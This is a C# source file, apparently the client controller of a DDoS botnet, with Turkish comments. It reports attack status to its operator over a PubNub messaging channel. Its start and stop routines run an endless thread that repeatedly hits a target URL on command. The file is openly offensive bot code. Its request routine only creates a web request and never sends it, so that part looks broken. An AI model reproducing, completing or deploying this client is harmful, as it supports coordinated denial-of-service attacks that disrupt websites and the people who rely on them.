using AtackerDTO;
using AttackerCommon;
using ChannelController;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using PubnubApi;
using System.Threading;
using System.Net;

namespace AttackerClient
{
    class ClientController
    {
        static Thread trdAttack = null;

        /// <summary>
        /// Mesaj yayınlar
        /// </summary>
        /// <param name="pubnub"></param>
        /// <param name="SenderId"></param>
        /// <param name="Status"></param>
        /// <param name="Data"></param>
        public static void PublishStatusMessage(Pubnub pubnub, string SenderId, ref ClientStatusType Status, ref string Data)
        {
            Publisher publisher = new Publisher(pubnub);

            MessageType messageType;

            switch (Status)
            {
                case ClientStatusType.Normal:
                    messageType = MessageType.ClientStatus;
                    break;
                case ClientStatusType.Message:
                    messageType = MessageType.TextToServers;
                    break;
                case ClientStatusType.Error:
                    messageType = MessageType.ClientError;
                    break;
                case ClientStatusType.Attacking:
                    messageType = MessageType.ClientAttacking;
                    break;
                default:
                    messageType = MessageType.ClientStatus;
                    break;
            }

            WriteMessage($"messageType: {messageType.ToString()} Publishing");

            publisher.PublishMessage(new MessageDTO(messageType, SenderId, Data), (isError, errorMessage) =>
            {
                if (!isError)
                {
                    WriteMessage($"messageType: {messageType.ToString()} Published");
                }
                else
                {
                    WriteMessage($"messageType: {messageType.ToString()} Error!: " + errorMessage);
                }

                return !isError;
            });
        }

        /// <summary>
        /// Saldırıyı başlatır
        /// </summary>
        /// <param name="url"></param>
        public static void StartAttack(ref ClientStatusType Status, ref string Data, string url, Func<Exception, bool> afterError)
        {
            /*
             Saldırı önce durdurulup tekrar başlatılıyor
             */
            StopAttack(ref Status, ref Data);

            bool isStartedAttack = false;

            if (trdAttack == null)
            {
                trdAttack = new Thread(() =>
                {
                    try
                    {
                        int i = 0;
                        while (true)
                        {
                            i++;

                            if (i % 10000 == 0)
                            {
                                WriteMessage("Attacking: " + i.ToString());
                                WriteMessage("Url: " + url);
                                AttackUrl(url);
                            }
                        }
                    }
                    catch(ThreadAbortException ee)
                    {
                        return;
                    }
                    catch (Exception ee)
                    {
                        WriteMessage("Error: " + ee.Message);
                        afterError(ee);
                        
                    }
                });
                trdAttack.Start();
                isStartedAttack = true;
            }

            if(isStartedAttack)
            {
                Status = ClientStatusType.Attacking;
                Data = url;
            }

        }

        /// <summary>
        /// Saldırı yaparr
        /// </summary>
        /// <param name="uri"></param>
        private static void AttackUrl(string uri)
        {
            WebRequest webRequest = HttpWebRequest.Create(uri);
        }

        /// <summary>
        /// Saldırıyı durdurur
        /// </summary>
        /// <param name="url"></param>
        public static void StopAttack(ref ClientStatusType Status, ref string Data)
        {
            Status = ClientStatusType.Normal;
            Data = String.Empty;

            if (trdAttack != null)
            {
                trdAttack.Abort();
                trdAttack = null;
            }

            WriteMessage("Attacking stopped");
        }

        /// <summary>
        /// Ekrana mesajı yazar
        /// </summary>
        /// <param name="message"></param>
        public static void WriteMessage(string message)
        {
#if DEBUG
            Console.WriteLine(message);
#endif
        }
    }
}
